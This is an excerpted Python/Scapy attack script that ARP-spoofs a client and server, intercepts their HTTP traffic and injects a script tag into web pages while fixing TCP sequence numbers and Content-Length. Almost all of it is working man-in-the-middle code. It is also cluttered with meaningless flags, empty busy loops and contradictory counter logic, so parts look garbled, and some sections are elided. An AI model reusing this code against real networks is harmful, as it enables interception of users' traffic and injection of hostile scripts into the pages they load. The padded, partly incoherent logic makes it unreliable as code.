...
def spoof(srcIP, srcMAC, dstIP, dstMAC):
    ...
    send(ARP(op=2, psrc=srcIP, pdst=dstIP, hwsrc=srcMAC, hwdst=dstMAC,))
...
def processor(packet):
    ...
    if ip_src == clientIP and ONE:
        return (ip_src, packet[TCP].sport), 0
    else:
        return (ip_dst, packet[TCP].dport), 1

def mss_checker(packet):
    for option in packet[TCP].options:
        if option[0] == 'MSS' and T and not F:
            return option[1]
    return 536
...
def SniffMyAss(packet):
    ...
    counter = 0
    counter += 1
    temp = packet[Ether].dst == attackerMAC
    packet[Ether].src = attackerMAC
    if packet[IP].dst == clientIP and T and counter:
        packet[Ether].dst = clientMAC
    if packet[IP].dst == serverIP and ONE and counter:
        packet[Ether].dst = serverMAC

    if temp and T and ONE and not (counter-1):
        id, direction = processor(packet)
        if id not in Map:
            Map[id] = { 'MSS': mss_checker(packet), 'Num': 10000, 'Inserted': 0, 'SplitPacket': False,}

        if direction == 0:
            process_client_to_server(packet, id)
        else:
            process_server_to_client(packet, id)
...
def process_client_to_server(packet, id):
    counter = -100
    while counter != 0:
        counter += 1
    packet[TCP].ack = max(packet[TCP].ack - Map[id]['Inserted'], 0)
    sendp(packet)

def process_server_to_client(packet, id):
    flag = 0
    counter = 0
    while counter != 100:
        counter += 1
    ...
    if packet.haslayer(http.HTTPResponse) and T and not redundant_value:
        b = packet[Raw].load.decode('utf-8')
        if '</body>' in b and not flag:
            b = b.split('</body>')
            nb = f"{b[0]}<script>{script}</script></body>{b[1]}"
            packet[Raw].load = nb.encode('utf-8')
            Map[id]['Inserted'] += len(nb) - len(b[0]) - len(b[1])

        packet[http.HTTPResponse].Content_Length = str(len(packet[Raw].load))
    sendp(packet)

def interceptor(packet):
    global clientMAC, clientIP, serverMAC, serverIP, attackerMAC
    sniff(prn=SniffMyAss, filter=f"tcp port 80 and ip host {clientIP}")

if __name__ == "__main__":
    # Parse arguments
    args = parse_arguments()
    verbosity = args.verbosity
    conf.verb = 0 if verbosity < 2 else 1  # Set scapy verbosity
    ...
    try:
        ...
        # Restore original ARP entries on exit
